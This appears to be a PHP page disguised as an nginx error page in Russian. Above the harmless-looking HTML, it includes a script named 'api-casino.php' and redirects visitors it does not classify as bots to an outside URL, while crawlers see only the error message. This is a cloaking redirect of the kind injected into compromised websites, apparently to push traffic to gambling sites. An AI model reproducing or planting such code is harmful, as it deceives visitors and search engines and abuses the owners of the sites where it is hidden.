<?php
include $_SERVER['DOCUMENT_ROOT'].'/go/api-casino.php';
if($z_bot == $z_empty && !empty($z_out)){header("Location: $z_out");}
?>
<!DOCTYPE html>
<html>
<head>
<title>Error</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Произошла ошибка.</h1>
<p>К сожалению, страница, которую вы ищете, в настоящее время недоступна.<br/>
Пожалуйста, попробуйте позже.</p>
<p>Если вы являетесь системным администратором этого ресурса, вам следует проверить
журнал ошибок для деталей.</p>
<p><em> С уважением, nginx.</em></p>
</body>
</html>